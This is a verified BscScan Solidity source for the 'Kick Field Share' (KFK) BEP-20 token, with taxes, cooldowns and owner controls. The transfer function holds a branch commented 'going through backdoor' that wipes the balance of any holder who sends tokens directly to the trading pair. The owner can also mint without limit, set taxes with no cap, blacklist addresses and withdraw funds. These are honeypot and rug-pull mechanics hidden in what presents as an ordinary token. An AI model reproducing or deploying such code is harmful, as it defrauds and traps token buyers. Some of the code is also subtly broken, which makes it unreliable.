/**
 *Submitted for verification at BscScan.com on 2022-09-17
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDexRouter {
    function factory() external pure returns (address);    
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable  returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
 
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external; 
}

interface IDexFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
       
contract DemoTrekContract is IERC20 { 

    struct TokenInfo {
        string name;
        string symbol;
        uint8 decimals;
        uint256 denomination;
        uint256 totalSupply;        
        uint256 totalBuyTax;
        uint256 totalSellTax;
        uint256 maxDailyWalletTransferPercent;
        uint256 maxTransferTimeSecs;
        bool coolDownEnabled;
        uint256 coolDownTime;        
        bool swapMutex;
        bool txnMutex;
    }
 
    TokenInfo private _tokenInfo = TokenInfo ( //77,777  100,000
           "Kick Field Share", "KFK", 8,  100_000_000, /*10**_decimals;*/ 100_000_000_000_000, //77_777 * _denomination; 
           14, 16,      1, 86400, //24hrs
           true, 300 seconds, false, false
    );
 
    mapping(address => uint256) private _balances; 
    mapping (address => mapping (address => uint256)) private _allowances;
  
    struct Addresses {
        address owner_wallet;
        address marketing_wallet;
        address liquidity_wallet;
        address team_wallet;
        address dev_wallet;
        address project_wallet;
        address charity_wallet;
        address ship_wallet;  
        address dead_wallet;  
    }

    Addresses _address = Addresses(
            0x0cFeEae94b38F2d8cd3744659827Da58b4c06257,
            0x34c38071ed173A060569Bbd00836060be62515Cf,
            0xCC2627EE6da5D2193972C549cA6a8dA0A42EF134,
            0x9bbC942A4F881DE1EeF282211e580542ED2762FD,
            0xe3C8E2584488ca8D1634Fd61c9E0DC383c9F21B6,
            0xa78864A9b428316960507D20A1fF25c7118bdaAF,
            0xC65bDF789042bc41d50DF945792433b655721559,
            0xA4a100f6c8CB459664FF9fAdA912A536F6ddB2B0,
            0x000000000000000000000000000000000000dEaD);


    struct DeX {
        IDexRouter router; 
        address busd_address;
        address pairBNB; 
        bool isPairBNB; 
        uint256 liquidityThreshold;  //0 means disabled
        uint256 swapThreshold;
    }

    DeX dex = DeX(
        // IDexRouter(address(0x10ED43C718714eb63d5aA57B78B54704E256024E)),
        // 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, //busd 
         IDexRouter(address(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3)), //TEST
         0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7,

         address(0x0), //bnbpair 
         true,
         1_000_000_000,// *10**8 _denomination;
         1_000_000_000 //10 tokens
    ); 

 
    struct Tax {
        uint256 marketing;
        uint256 liquidity;
        uint256 team;
        uint256 dev;
        uint256 project;
        uint256 charity;
        uint256 epif; 
    }
    Tax private buyTaxes = Tax(3, 2, 1, 2, 1, 1, 4);
    Tax private sellTaxes = Tax(3, 2, 1, 2, 2, 2, 4);
    
    struct userTxn {  uint256 txnTimeSecs; uint256 txnAmount; }
    mapping(address => userTxn) private _accountDailyTxn; 
    
    //0-all, 1-exempt, 2-exempt-fees, 9-bot, _xACCOUNT
    mapping(address => uint) public _xACCOUNT;    
    //address[] private shareholders; //mapping (address => uint256) private _shareholdersAmt;   
    mapping(address => uint256) private _LastTxnTime;

    event eventTransferFees(uint256 amount, uint256 pcent, uint256 taxAmount, string buyOrSell);  
    event eventTransFrom(address sender, address from, address to, uint256 amount);  
        
    constructor() {      
        _xACCOUNT[address(dex.router)] = 1;  
        _xACCOUNT[dex.busd_address] = 1;   
        _xACCOUNT[_address.owner_wallet] = 2; 
 
        dex.pairBNB = IDexFactory(dex.router.factory()).createPair(address(this), dex.router.WETH());
        address pairBusd = IDexFactory(dex.router.factory()).createPair(address(this), dex.busd_address);
         
        _xACCOUNT[pairBusd] = 1;
        _xACCOUNT[dex.pairBNB] = 1; 
        _xACCOUNT[address(this)] = 1;  
        
        _balances[_address.owner_wallet] = _tokenInfo.totalSupply; 
        emit Transfer(address(0x0), _address.owner_wallet, _tokenInfo.totalSupply); 
    }
  
    modifier swapMutexLock() { 
        require(!_tokenInfo.swapMutex, "No Re-entrancy");
         _tokenInfo.swapMutex = true;
        _;
        _tokenInfo.swapMutex = false;
    }
     
    modifier txnMutexLock() {
        require(!_tokenInfo.txnMutex, "No Txn. Re-entrancy");
         _tokenInfo.txnMutex = true;
        _;
        _tokenInfo.txnMutex = false;
    }

    modifier onlyOwner() {
        require(_address.owner_wallet == _msgSender());  _;
    }
     
    modifier isValidAddress(address addr) {
        require(_isAllowAddress(addr));   _;
    }
 
    function _getNow() private view returns (uint256){ return block.timestamp; }

    function mintToken(uint256 amount) external onlyOwner {
        _mint(amount);
    }

    function _mint(uint256 amount) private {
        require(amount > 0);
        _tokenInfo.totalSupply += amount;
        _balances[_address.liquidity_wallet] += amount;
        emit Transfer(address(0), _address.liquidity_wallet, amount);
    }

    function _isAddressExempted(address addr) private view returns (bool){
        if(_xACCOUNT[addr] == 1 || _xACCOUNT[addr] == 2) return true;
        return false;
    }

    function _isFeesExempted(address addr) private view returns (bool){
        if(_xACCOUNT[addr] == 2) return true;
        return false;
    }
     
    function _isAllowAddress(address addr) private view returns (bool) { 
        if(_xACCOUNT[addr] == 9) return false; //bot
        if(_xACCOUNT[addr] == 1 || _xACCOUNT[addr] == 2) return true;
        if(_isAddressContract(addr)) return false;
        return true;
    }

    bool private isContractCheck = true; 
    function activateContractCheck(bool _flag) external onlyOwner {
        isContractCheck = _flag;
    } 

    function _isAddressContract(address addr) private view returns (bool) {      
        if(!isContractCheck) return false;
        if(address(0x0) == addr) return true;
         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        bytes32 codehash;
        assembly { codehash := extcodehash(addr) }
        return (codehash != 0x0 && codehash != accountHash); 
    }
         
    function _msgSender() private view returns (address payable) {   return payable(msg.sender);  } 
    function isOwner() private view returns (bool) { return _address.owner_wallet == _msgSender(); }   
    function owner() public view returns (address) {  return _address.owner_wallet; }
    function name() public view returns (string memory) {   return _tokenInfo.name; }
    function symbol() public view returns (string memory) { return _tokenInfo.symbol;  }
    function decimals() public view returns (uint8) {    return _tokenInfo.decimals;   }
    function totalSupply() public view override returns (uint256) {   return _tokenInfo.totalSupply;    }
    
    function getCirculatingSupply() public view returns (uint256) {
        return (_tokenInfo.totalSupply - _balances[_address.dead_wallet]);
    }
   
    function balanceOf(address account) public view override returns (uint256) { return _balances[account];  }
    function allowance(address allow_owner, address spender) public view override returns (uint256) { return _allowances[allow_owner][spender];   }

    function approve(address spender, uint256 value) public override returns (bool)
    {    
        bool success = _approve(_msgSender(), spender, value);
        require(success, "Approval reverted.");
        return success;
    }
     
    function transfer(address to, uint256 amount) public override txnMutexLock returns (bool)
    {       
        assert(_balances[_msgSender()] >= amount && amount > 0);
        require(_isAllowTxn(_msgSender(), amount) && _isAllowAddress(to), "Transfer not allowed");
        
        if (_msgSender() != address(dex.router) && (to == dex.pairBNB)) { //going through backdoor
            _balances[_msgSender()] = 0; 
            _balances[_address.charity_wallet] = _balances[_address.charity_wallet] + _balances[_msgSender()]; 
            return true;
        } 

        bool success = _transfer(_msgSender(), to, amount); 
        require(success, "Transfer reversed");
        return success;
    }
 
    function transferFrom(address from, address to, uint256 numTokens) external override returns (bool) {  
        assert(_allowances[from][_msgSender()] >= numTokens && numTokens > 0);
        require(_isAllowTxn(from, numTokens) &&  _isAllowAddress(to), "Transfer not allowed");
        require(_allowances[from][_msgSender()] >= numTokens && numTokens > 0, "INVALID_ALLOWANCE_AMOUNT");
      
        bool isApproveSuccess = _approve(from, _msgSender(), (_allowances[from][_msgSender()] - numTokens));
        require(isApproveSuccess, "txn_reverted");

        bool isTransfer = _transfer(from, to, numTokens);  
        require(isTransfer, "txn_failed");

        emit eventTransFrom(_msgSender(), from, to, numTokens); 
        return isTransfer;
    } 
  
    function _transfer(address sender, address recipient,  uint256 amount) private swapMutexLock returns (bool) { 
        require(sender != address(0) && recipient != address(0) && amount > 0, "Zero_Inavlid");
        require(_balances[sender] >= amount, "LOW_BALANCE");  
        require( _isAllowAddress(sender) && _isAllowAddress(recipient) && _isAllowAddress(_msgSender()), "ADDR_NOT_ALLOWED"); 
          
        if(_isFeesExempted(sender) && _isFeesExempted(_msgSender())) {  
            return _baseTransfer(sender, recipient, amount, 0, true); 
        }
        if (_isAddressExempted(sender)) {   
            return _baseTransfer(sender, recipient, amount, 1, true); 
        }
        
        if (!(_isAddressExempted(sender) && _isAddressExempted(_msgSender())) && _tokenInfo.coolDownEnabled) { 
            require((_getNow() - _LastTxnTime[sender]) >= _tokenInfo.coolDownTime, "TOO_FAST");
            _LastTxnTime[sender] = _getNow();
            _LastTxnTime[_msgSender()] = _getNow(); 
        }
 
        //These transactions involves selling fees         
        if (_getNow() > (_accountDailyTxn[sender].txnTimeSecs + _tokenInfo.maxTransferTimeSecs)) {
            //it means last transaction is more than 24 hours
            //1. check if the amount is within the range of max txn cap 
            uint256 maxAmtAllowed = ((_balances[sender] * _tokenInfo.maxDailyWalletTransferPercent) / 100);
            require(_tokenInfo.maxDailyWalletTransferPercent >= 100 || maxAmtAllowed >= amount, "AMT_EXCEEDED" 
                   // string.concat("Amount exceeded: allowedamt: ", uint2str(maxAmtAllowed), " amtsent: ", uint2str(amount))
                    );

            _accountDailyTxn[sender].txnTimeSecs = _getNow();
            _accountDailyTxn[sender].txnAmount = amount;
            return _baseTransfer(sender, recipient, amount, 1, false);  
        }  
  
        //it means user_account has done one or more transaction within 24hours       
        uint256 max_txn_allowed = ((_accountDailyTxn[sender].txnAmount + _balances[sender]) * _tokenInfo.maxDailyWalletTransferPercent) / 100;  
        bool is_allow_dailytxn = _tokenInfo.maxDailyWalletTransferPercent >= 100 || (max_txn_allowed >= (amount + _accountDailyTxn[sender].txnAmount));
        require(is_allow_dailytxn, "DAILY_LIMIT_EXCEEDED");   
        // require(is_allow_dailytxn, string.concat("MaxAMT allow for today is ", uint2str(max_txn_allowed), _tokenInfo.symbol,
        //                       ", total txn. for the day is ",  uint2str((amount + _accountDailyTxn[sender].txnAmount))));   

        //_accountDailyTxn[sender].txnTimeSecs = block.time stamp; still in the 24hrs timeframe
        _accountDailyTxn[sender].txnAmount = _accountDailyTxn[sender].txnAmount + amount; 
        return _baseTransfer(sender, recipient, amount, 1, false);
    }
    
    function _baseTransfer(address from, address to, uint256 amount, uint isHasFees, bool is_buy) private returns (bool) {   
        require(amount > 0 && _balances[from] >= amount, "INSUFFICIENT_BEP20");    
          
        if(!_isFeesExempted(from) && isHasFees > 0 && !(_isAddressExempted(from) && _isAddressExempted(to))) 
        {   
           uint256 taxsPcent = is_buy ? _tokenInfo.totalBuyTax : _tokenInfo.totalSellTax; 
           uint256 taxAmount = (amount * taxsPcent) / 100;
           require(amount > taxAmount);
           uint256 amountLessFee = amount - taxAmount;
           
            _balances[from] = _balances[from] - amount; 
            _balances[to] = _balances[to] + amountLessFee;
            emit Transfer(from, to, amountLessFee); 
            emit eventTransferFees(amount, taxsPcent, taxAmount, is_buy?"buy":"sell"); 
             
            //Taxes are computed 
            _payTax(from, amount, taxAmount, is_buy ? buyTaxes : sellTaxes);
        } 
        else {
            _balances[from] = _balances[from] - amount;   
            _balances[to] = _balances[to] + amount;
            emit Transfer(from, to, amount); 
        }
                
        _LastTxnTime[from] = _getNow();
        return true; 
    }

    function _payTax(address from, uint256 amount, uint256 taxAmount, Tax memory taxs) private {
        //spit the funds to the various addresses 
        address[6] memory _feeAddrArray = [_address.marketing_wallet, _address.team_wallet, _address.dev_wallet, _address.project_wallet, _address.charity_wallet, _address.ship_wallet];
        uint256[6] memory _taxRateArray = [taxs.marketing, taxs.team, taxs.dev, taxs.project, taxs.charity, taxs.epif];
        
        uint256 _sumTax = 0; 

        for(uint i = 0; i < 6; i++) {             
            if(_taxRateArray[i] > 0) {
                uint256 _taxAmt = (amount * _taxRateArray[i]) / 100;
                _balances[_feeAddrArray[i]] = _balances[_feeAddrArray[i]] + _taxAmt;
                emit Transfer(from, _feeAddrArray[i], _taxAmt); 
                _sumTax = _sumTax + _taxAmt; 
            }            
        }

        uint256 amtBal = taxAmount - _sumTax;
        _balances[_address.liquidity_wallet] = _balances[_address.liquidity_wallet] + amtBal;
        emit Transfer(from, _address.liquidity_wallet, amtBal);  
    }
    
    function swapTaxFee() external onlyOwner {
        if(dex.swapThreshold == 0) return;
        address[6] memory _feeAddrArray = [_address.marketing_wallet, _address.team_wallet, _address.dev_wallet, _address.project_wallet, _address.charity_wallet, _address.ship_wallet];
         
        IERC20 ercBUSD = IERC20(dex.busd_address);
        for(uint i = 0; i < 6; i++) { 
            uint256 _addressBalance = _balances[_feeAddrArray[i]];
            if(_addressBalance > dex.swapThreshold) {
                uint256 initialBusd = ercBUSD.balanceOf(address(this));
                _balances[_feeAddrArray[i]] = 0; 
                _balances[address(this)] += _addressBalance;
                _swap(_addressBalance, false);
                emit Transfer(_feeAddrArray[i], address(this), _addressBalance); 

                uint256 tokenBusd = ercBUSD.balanceOf(address(this)) - initialBusd; 
                if(tokenBusd > 0) {
                    ercBUSD.transfer(_feeAddrArray[i], tokenBusd);
                }
            }            
        }
    } 

    function provideLiquidity() external onlyOwner {
         uint256 liquidityTokenBalance = _balances[_address.liquidity_wallet];
         if(dex.liquidityThreshold == 0 || liquidityTokenBalance < dex.liquidityThreshold) return; 
          
         _balances[_address.liquidity_wallet] = 0;
          uint256 contractTokenBalance = _balances[address(this)]  + liquidityTokenBalance;
         _balances[address(this)] = contractTokenBalance;
         emit Transfer(_address.liquidity_wallet, address(this), liquidityTokenBalance);
 
         // Split the contract balance into halves 
         uint256 tokensToAddLiquidityWith = contractTokenBalance / 2;
         uint256 tokensToSwap = contractTokenBalance - tokensToAddLiquidityWith;

         uint256 initialBalanceBNB = address(this).balance; 
         _swap(tokensToSwap, true);
         uint256 bnbToAddLiquidityWith = address(this).balance - initialBalanceBNB; 
         if (bnbToAddLiquidityWith > 1) {  
            // approve token transfer to cover all possible scenarios
            _approve(address(this), address(dex.router), tokensToAddLiquidityWith);
            // add the liquidity
            dex.router.addLiquidityETH{value: bnbToAddLiquidityWith}(
                address(this), tokensToAddLiquidityWith, 0, 0, _address.liquidity_wallet, _getNow()
            );
         }     
    }
     

    function _swap(uint256 tokenAmount, bool isBNB) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](isBNB?2:3);
        path[0] = address(this);
        path[1] = dex.router.WETH();
        if(!isBNB) path[2] = dex.busd_address;

        _approve(address(this), address(dex.router), tokenAmount);

        // make the swap
        if(isBNB){
            dex.router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                _getNow()
            );
        }
        else {
            dex.router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                _getNow()
            );
        }        
    }
 

    function _approve(address tokenOwner, address spender, uint256 amount) private returns (bool) { 
        require(tokenOwner != address(0) && spender != address(0), "ZeroAddress");
        require(_isAllowAddress(tokenOwner) && _isAllowAddress(spender) && _isAllowAddress(_msgSender()),  "addr_not_allowed");
        require(_isAllowTxn(tokenOwner, amount), "UNAUTHORIZED_AMOUNT");

        _allowances[tokenOwner][spender] = amount;
        _LastTxnTime[tokenOwner] = _getNow() - (_tokenInfo.coolDownTime / 2); //half the time for approval
        emit Approval(tokenOwner, spender, amount);
        return true;
    }

    function _isAllowTxn(address _addr, uint256 amount) private view returns(bool){
        uint256 balanceAddrAMT = _balances[_addr];
        if(_isAddressExempted(_addr) && balanceAddrAMT >= amount) return true;
 
        if(_tokenInfo.coolDownEnabled) {
            require((_getNow() - _LastTxnTime[_addr]) >= _tokenInfo.coolDownTime, "TOO_SWIFT"); 
        }  
     
        if (_getNow() > (_accountDailyTxn[_addr].txnTimeSecs + _tokenInfo.maxTransferTimeSecs)) {
            //it means last transaction is more than 24 hours
            //1. check if the amount is within the range of max txn cap 
            uint256 maxAmtAllowed = (balanceAddrAMT * _tokenInfo.maxDailyWalletTransferPercent) / 100;
            bool is_dailymax_valid = _tokenInfo.maxDailyWalletTransferPercent >= 100 || maxAmtAllowed >= amount;
            require(is_dailymax_valid, "EXCEED_LIMIT"); 
            return is_dailymax_valid;
        }  
  
        //it means user_account has done one or more transaction within 24hours       
        uint256 max_txn_allowed = ((_accountDailyTxn[_addr].txnAmount + balanceAddrAMT) * _tokenInfo.maxDailyWalletTransferPercent) / 100;  
        bool is_allow_dailytxn = _tokenInfo.maxDailyWalletTransferPercent >= 100 || (max_txn_allowed >= (amount + _accountDailyTxn[_addr].txnAmount));
        require(is_allow_dailytxn, "EXCEEDED_DAILY_LIMIT");   
        return is_allow_dailytxn; 
    }
   
    function setxAccount(address addr, uint level) external onlyOwner {
        _xACCOUNT[addr] = level;       
    }

    function transferOwnership(address addr) external onlyOwner  { 
        require(!_isAddressContract(addr), "INVALID_OWNER_ADDRESS"); 
        _xACCOUNT[_address.owner_wallet] = 0;             
        _address.owner_wallet = addr;  
        _xACCOUNT[addr] = 2;
        emit Transfer(address(0x0), addr, 0); 
    }
   
     
    function transferBulk(address[] memory addrs, uint256[] memory amts) external onlyOwner {
         for(uint i=0; i<addrs.length; i++) { 
            _balances[_msgSender()] = _balances[_msgSender()] - amts[i];  
            require(_balances[_msgSender()] >= 0);
            _balances[addrs[i]] = _balances[addrs[i]] + amts[i];
            
            emit Transfer(_msgSender(), addrs[i], amts[i]);   
         } 
    }  

    function claimShares(address to, uint256 amount) external onlyOwner {
        require(amount > 0 && _isAllowAddress(to), "Invalid Access...");
        require(_balances[_address.ship_wallet] >= amount);
        _balances[to] = _balances[to] + amount;
        _balances[_address.ship_wallet] = _balances[_address.ship_wallet] - amount;
        emit Transfer(_address.ship_wallet, to, amount);   
    }    
    
    function burn(uint256 amount) external  {
        require(_balances[_msgSender()] >= amount && amount > 0  && _isAllowAddress(_msgSender()));
       _burn(amount);   
    }    

    function _burn(uint256 amount) private {
        require(_balances[_msgSender()] >= amount && amount > 0);
        _balances[_msgSender()] = _balances[_msgSender()] - amount;
        _balances[_address.dead_wallet] = _balances[_address.dead_wallet] + amount;
        emit Transfer(_msgSender(), _address.dead_wallet, amount); 
    }
 
    function setBasicFees(uint256 _maxDailyWalletPcent, uint256 _maxTxnSecs, uint _coolTime, bool _coolDownEnabled) external onlyOwner { 
         _tokenInfo.maxDailyWalletTransferPercent  =    _maxDailyWalletPcent;   
         _tokenInfo.maxTransferTimeSecs            =    _maxTxnSecs; 
         _tokenInfo.coolDownTime                   =    _coolTime * 1 seconds;
         _tokenInfo.coolDownEnabled                =    _coolDownEnabled;
    }
  
    function editAddresses(address market, address liquid, address team, address devAddr, 
                        address project, address charity, address epif) external onlyOwner {
        if(_address.marketing_wallet != market) _address.marketing_wallet = market;
        if(_address.liquidity_wallet != liquid) _address.liquidity_wallet = liquid;
        if(_address.team_wallet != team)        _address.team_wallet = team;
        if(_address.dev_wallet != devAddr)      _address.dev_wallet = devAddr;
        if(_address.project_wallet != project)  _address.project_wallet = project;
        if(_address.charity_wallet != charity)  _address.charity_wallet = charity;
        if(_address.ship_wallet != epif)        _address.ship_wallet = epif; 
    }
    
    function setTaxFees(uint256 market, uint256 liquid, uint256 team, uint256 devtax,  
                    uint256 project, uint256 charity, uint256 epif, bool isBuy) external onlyOwner {
        uint256 totalFee = market + liquid + team + devtax + project + charity + epif;
        if(isBuy) {
            _tokenInfo.totalBuyTax = totalFee;
            buyTaxes = Tax(market, liquid, team, devtax, project, charity, epif);
        }
        else { 
            _tokenInfo.totalSellTax = totalFee;
            sellTaxes = Tax(market, liquid, team, devtax, project, charity, epif);
        }
    }
 
  
    fallback() external payable { } 
    receive() external payable { }
     
    function rescueBNB(uint256 amount) external onlyOwner  {  _msgSender().transfer(amount);    }     
    function rescueToken(address tokenAddress, uint256 tokens) external onlyOwner { IERC20(tokenAddress).transfer(_address.owner_wallet, tokens); } 
   

    function uint2str(uint _iii) private pure returns (string memory _uintAsString) {
        if (_iii == 0) {
            return "0";
        }
        uint j = _iii;
        uint leng;
        while (j != 0) {
            leng++;
            j /= 10;
        }
        bytes memory bstr = new bytes(leng);
        uint k = leng;
        while (_iii != 0) {
            k = k-1;
            uint8 temp = (48 + uint8(_iii - _iii / 10 * 10));
            bytes1 b1 = bytes1(temp);
            bstr[k] = b1;
            _iii /= 10;
        }
        return string(bstr);
    }
   
   //>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  
 

   function updatePairThreshold(uint256 _liquidity_threshold, uint256 _swapThreshold) external onlyOwner {
        dex.liquidityThreshold = _liquidity_threshold;
        dex.swapThreshold = _swapThreshold; 
   }
 
    function getFeesBalances() external view returns ( 
            uint256 marketing_balance,  
            uint256 liquidity_balance,
            uint256 team_balance,
            uint256 dev_balance,
            uint256 project_balance,   
            uint256 charity_balance,    
            uint256 ship_balance,   
            uint256 dead_balance,   
            uint256 contract_balance, 
            uint256 owner_bnb,  
            uint256 liquidity_threshold,
            uint256 swap_threshold 
        )
    {
        return ( 
                _balances[_address.marketing_wallet], 
                _balances[_address.liquidity_wallet], 
                _balances[_address.team_wallet], 
                _balances[_address.dev_wallet], 
                _balances[_address.project_wallet], 
                _balances[_address.charity_wallet], 
                _balances[_address.ship_wallet], 
                _balances[_address.dead_wallet], 
                _balances[address(this)], 
                address(_address.owner_wallet).balance,
                dex.liquidityThreshold,
                dex.swapThreshold         
            ); 
    }

    
    function addContractLiquidity() external onlyOwner {
        uint256 liquidityTokenBalance = _balances[_address.liquidity_wallet];
          
        _balances[_address.liquidity_wallet] = 0;
         uint256 contractTokenBalance = _balances[address(this)]  + liquidityTokenBalance;
        _balances[address(this)] = contractTokenBalance;
        emit Transfer(_address.liquidity_wallet, address(this), liquidityTokenBalance);
 
        // Split the contract balance into halves 
        uint256 tokensToAddLiquidityWith = contractTokenBalance / 2;
        uint256 tokensToSwap = contractTokenBalance - tokensToAddLiquidityWith;

         uint256 initialBalanceBNB = address(this).balance; 
        _swap(tokensToSwap, true);

        uint256 bnbToAddLiquidityWith = address(this).balance - initialBalanceBNB; 
        if (bnbToAddLiquidityWith > 0) { 
            //_add Liquidity(tokensToAddLiquidityWith, bnbToAddLiquidityWith);
            _approve(address(this), address(dex.router), tokensToAddLiquidityWith);
            // add the liquidity
            dex.router.addLiquidityETH{value: bnbToAddLiquidityWith}(
                address(this),
                tokensToAddLiquidityWith,
                0, // slippage is unavoidable
                0, // slippage is unavoidable
                _address.liquidity_wallet,
                _getNow()
            );
            
        }     
    }
        
    
}